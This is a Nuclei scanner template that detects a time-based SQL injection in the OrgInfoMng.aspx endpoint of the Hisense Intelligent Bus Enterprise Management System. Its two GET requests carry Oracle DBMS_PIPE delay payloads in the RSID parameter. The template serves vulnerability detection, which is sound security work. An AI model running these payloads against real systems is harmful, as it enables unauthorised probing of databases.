id: hisense-transtech-orginfomng-sqli
info:
  name: "OrgInfoMng.aspx 存在 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: hisense
  description: |
    Detects a SQL injection vulnerability in the Hisense Intelligent Bus Enterprise Management System's OrgInfoMng.aspx endpoint.

http:
  - raw:
      - |
        GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1'and+1=(DBMS_PIPE.RECEIVE_MESSAGE('a',5))+and+'1'='1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
      - |
        GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1'and+1=(DBMS_PIPE.RECEIVE_MESSAGE('a',8))+and+'1'='1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Error Report"
          - "SQL"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
